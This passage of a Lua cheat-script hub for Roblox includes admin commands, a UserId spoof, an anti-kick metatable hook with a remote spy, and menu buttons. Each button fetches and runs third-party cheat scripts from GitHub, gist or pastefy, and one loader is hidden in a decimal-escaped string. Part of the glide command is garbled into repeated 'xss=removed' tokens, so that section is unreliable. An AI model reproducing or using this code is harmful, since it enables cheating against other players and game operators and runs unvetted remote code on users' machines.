 for i,v in pairs(LP.Character:GetDescendants()) do
  if v:IsA("Accessory") or v:IsA("Hat") then
   pcall(function()
    run(commandPrefix.."drophats")
    wait(2)
    v.Handle.spin:Destroy()
    v.Handle.keep:Destroy()
   end)
  end
 end
end

savedmap = {}
Commands.savemap = function(args)
 for i,v in pairs(gsWorkspace:GetChildren()) do
  v.Archivable = true
  if not v:IsA("Terrain") and not v:IsA("Camera") then
   if not gsPlayers:FindFirstChild(v.Name) then
    table.insert(savedmap, v:Clone())
   end
  end
 end
 clientSided()
end

Commands.loadmap = function(args)
 for i,v in pairs(gsWorkspace:GetChildren()) do
  if not v:IsA("Terrain") and not v:IsA("Camera") then
   if not gsPlayers:FindFirstChild(v.Name) then
    pcall(function()
     v:Destroy()
    end)
   end
  end
 end
 for i,a in ipairs(savedmap) do
  a:Clone().Parent = gsWorkspace
 end
 clientSided()
end

Commands.creatorid = function(args)
 LP.UserId = game.CreatorId
end

Commands.gameid = function(args)
 Notification("info", "Current game's ID = "..game.GameId, 8)
end

Commands.delobj = function(args)
 if args[1] then
  for i,v in pairs(gsWorkspace:GetDescendants()) do
   if string.lower(v.Name) == string.lower(tostring(args[1])) then
    v:Destroy()
    clientSided()
   end
  end
 end
end

Commands.glide = function(args)
 if args[1] then
  for i,v in pairs(findSinglePlayer(args[1])) do
   local goal = {}
   goal.CFrame = v.Character.HumanoidRootPart.CFrame
   local defaultSpeed = 3
   if args[2] then
    if tonumber(args[2]) < 10 xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed Anim.AnimationId = "rbxassetid://179224234" xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed Anim.AnimationId = "rbxassetid://282574440" xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed xss=removed>= 365 then
    table.insert(players,v)
   end
  end
 elseif mplr == "oldveterans" then
  for i,v in pairs(gsPlayers:GetPlayers()) do
   if v.AccountAge >= 1500 then
    table.insert(players,v)
   end
  end
 elseif mplr == "friends" then
  for i,v in pairs(gsPlayers:GetPlayers()) do
   if v:IsFriendsWith(LP.UserId) and v.Name ~= LP.Name then
    table.insert(players,v)
   end
  end
 elseif mplr == "nofriends" then
  for i,v in pairs(gsPlayers:GetPlayers()) do
   if not v:IsFriendsWith(LP.UserId) and v.Name ~= LP.Name then
    table.insert(players,v)
   end
  end
 elseif mplr == "default" then
  for i,v in pairs(gsPlayers:GetPlayers()) do
   if v.Character:FindFirstChild("Pal Hair") or v.Character:FindFirstChild("Kate Hair") then
    table.insert(players,v)
   end
  end
 elseif mplr == "random" then
  for i,v in pairs(gsPlayers:GetPlayers()) do
   table.insert(players,v[math.random(1, #v)])
  end
 elseif mplr == "sameteam" then
  for i,v in pairs(gsPlayers:GetPlayers()) do
   if v.Team == LP.Team then
    table.insert(players,v)
   end
  end
 elseif mplr == "noteam" then
  for i,v in pairs(gsPlayers:GetPlayers()) do
   if v.Team == nil then
    table.insert(players,v)
   end
  end
 elseif mplr == "otherteam" then
   for i,v in pairs(gsPlayers:GetPlayers()) do
    if v.Team ~= LP.Team then
     table.insert(players,v)
    end
   end
 elseif string.sub(mplr, 1, 4) == "team" then
   for i,v in pairs(gsPlayers:GetPlayers()) do
    local spaceTEAM = {}
    for teamValues in (string.gmatch(string.sub(mplr, 5), "[^_]+")) do
     spaceTEAM[#spaceTEAM + 1] = teamValues
    end
    local gottrueteam = table.concat(spaceTEAM, " ")
    if string.lower(tostring(v.Team)) == string.lower(gottrueteam) then
     table.insert(players,v)
    end
   end 
     else
   for i,v in pairs(gsPlayers:GetPlayers()) do
             if string.lower(v.Name):sub(1, #mplr) == string.lower(mplr) then
                 table.insert(players,v)
             end
   end
     end
 end

    return players    
end
function getmultipleplayers(plr)
 local plrsgotten = {}
 for i in string.gmatch(plr,"[^,]+") do
  table.insert(plrsgotten,i)
 end
 return plrsgotten
end
function findSinglePlayer(plr)
    local players = {}
    local find = plr:lower()
 if find == "me" then
  table.insert(players,LP)
 else
  for i,v in pairs(gsPlayers:GetPlayers()) do
         if string.lower(v.Name):sub(1, #find) == string.lower(find) then
             table.insert(players,v)
         end
  end
 end
 local oneplayer = {}
 pcall(function()
  table.insert(oneplayer, players[math.random(1, #players)])
 end)
 return oneplayer
end

-- Anti Kick

if getrawmetatable then
 function formatargs(getArgs,v)
  if #getArgs == 0 then 
   return "" 
  end
  
  local collectArgs = {}
  for k,v in next,getArgs do
   local argument = ""
   if type(v) == "string" then
    argument = "\""..v.."\""
   elseif type(v) == "table" then
    argument = "{" .. formatargs(v,true) .. "}"
   else
    argument = tostring(v)
   end
   if v and type(k) ~= "number" then
    table.insert(collectArgs,k.."="..argument)
   else
    table.insert(collectArgs,argument)
   end
  end
  return table.concat(collectArgs, ", ")
 end
 
 kicknum = 0
 local game_meta = getrawmetatable(game)
 local game_namecall = game_meta.__namecall
 local game_index = game_meta.__index
 local w = (setreadonly or fullaccess or make_writeable)
 pcall(w, game_meta, false)
 game_meta.__namecall = function(out, ...)
  local args = {...}
  local Method = args[#args]
  args[#args] = nil
  
  if Method == "Kick" and out == LP then
   kicknum = kicknum + 1
   warn("Blocked client-kick attempt "..kicknum)
   return
  end
  
  if antiremotes then
   if Method == "FireServer" or Method == "InvokeServer" then
    if out.Name ~= "CharacterSoundEvent" and out.Name ~= "SayMessageRequest" and out.Name ~= "AddCharacterLoadedEvent" and out.Name ~= "RemoveCharacterEvent" and out.Name ~= "DefaultServerSoundEvent" and out.Parent ~= "DefaultChatSystemChatEvents" then
     warn("Blocked remote: "..out.Name.." // Method: "..Method)
     return
    end
   end
  else
   if Method == "FireServer" or Method == "InvokeServer" then
    for i,noremote in pairs(blockedremotes) do
     if out.Name == noremote and out.Name ~= "SayMessageRequest" then
      warn("Blocked remote: "..out.Name.." // Method: "..Method)
      return
     end
    end
   end
  end
  
  if spyingremotes then
   if Method == "FireServer" or Method == "InvokeServer" then
    if out.Name ~= "CharacterSoundEvent" and out.Name ~= "AddCharacterLoadedEvent" and out.Name ~= "RemoveCharacterEvent" and out.Name ~= "DefaultServerSoundEvent" and out.Name ~= "SayMessageRequest" then
     local arguments = {}
     for i = 1,#args do
      arguments[i] = args[i]
     end
     local getScript = getfenv(2).script
     if getScript == nil then
      getScript = "??? (Not Found) ???"
     end
     warn("<> <> <> A "..out.ClassName.." has been fired! How to fire:\ngame."..out:GetFullName()..":"..Method.."("..formatargs(arguments)..")\n\nFired from script: ".. tostring(getScript:GetFullName()))
    end
   end
  end
  
  return game_namecall(out, ...)
 end
end

-- FE Check
function FEcheckDefault()
 if gsWorkspace.FilteringEnabled == true then
  createIntro("warning", "FE is enabled! Press "..commandPrefix.." to bring Command Bar.", 7)
 else
  createIntro("warning", "FE is disabled. Consider using a different script.", 7)
 end
end
FEcheckDefault()
   end,
}) 

local Button = Tab:CreateButton({
   Name = "HomeBrew Admin",
   Callback = function()
          loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Syntaxx64/HomebrewAdmin/master/Main"))()
   end,
}) 

local Button = Tab:CreateButton({
   Name = "Unknow Admin",
   Callback = function()
          loadstring("\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\40\39\104\116\116\112\115\58\47\47\112\97\115\116\101\102\121\46\103\97\47\102\71\89\97\52\105\55\116\47\114\97\119\39\41\44\116\114\117\101\41\41\40\41\10")()
   end,
}) 

local Button = Tab:CreateButton({
   Name = "Comet Admin",
   Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/FilteringEnabled/FE/main/Comet"))();
   end,
}) 

local Tab = Window:CreateTab("Dragon Ball Xl", 4483362458)

local Section = Tab:CreateSection("RoxHub")

local Button = Tab:CreateButton({
   Name = "Rox Hub",
   Callback = function()
          pcall(function()
Rox_Hub = true
loadstring(game:HttpGet("https://gist.githubusercontent.com/HaxxV1/d7cfdb5090e819a84a8db22fb113f39d/raw"))()
end)
   end,
}) 

local Tab = Window:CreateTab("Alternate Battlegrounds", 4483362458)

local Section = Tab:CreateSection("Hubs")

local Button = Tab:CreateButton({
   Name = "Alternate Battlegrounds [Auto Click, PlayerSnipe]",
   Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/xtrey10x/xtrey10x-hub/main/Alternativescript"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Unix Hub",
   Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/UnixUniversal/neverlose-ui-rework/main/scripts/redast/source.lua"))()
   end,
})

local Button = Tab:CreateButton({
   Name = "Acrylix Hub",
   Callback = function()
          loadstring(game:HttpGet('https://raw.githubusercontent.com/3dsonsuce/acrylix/main/Acrylix"))()
   end,
})

local Section = Tab:CreateSection("Others")

local Button = Tab:CreateButton({
   Name = "Dodge",
   Callback = function()
          --[[
	WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
]]
--[Made by ThroughTheFireAndFlames#9925]
--[https://www.roblox.com/games/8573962925/Alternate-Battlegrounds-apil-fools]--

getgenv().AutoExecute = true 

getgenv().Keybind = "V"
getgenv().Distance = 35

getgenv().Aura = true 
getgenv().Sounds = true

getgenv().LookAtNearestPlayer = false
getgenv().LookAtDistance  = 25
getgenv().LookAtKeybind = "V" 

loadstring(game:HttpGet("https://raw.githubusercontent.com/Lvl9999/AB/main/Ui"))();
   end,
})

local Button = Tab:CreateButton({
   Name = "Everality Hub",
   Callback = function()
          loadstring(game:HttpGet("https://raw.githubusercontent.com/Everality/ABScriptFunny/main/yes"))();
   end,
})
